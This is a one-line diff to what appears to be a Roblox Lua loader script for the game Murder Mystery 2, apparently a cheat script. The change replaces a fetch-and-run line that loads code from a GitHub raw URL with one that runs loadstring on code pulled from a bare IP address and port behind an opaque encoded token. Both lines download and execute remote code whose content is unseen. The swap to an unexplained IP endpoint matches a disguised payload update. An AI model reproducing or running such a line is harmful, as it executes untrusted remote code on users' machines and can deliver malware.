@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/MurderMystery2/main.lua", true))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImI5NDRkZGQzLTI3OGEtNDljNy05MDIxLTBiZGRhMjQ1NDQ3MyIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6InVuaXZlcnNhbCJ9fQ"))()
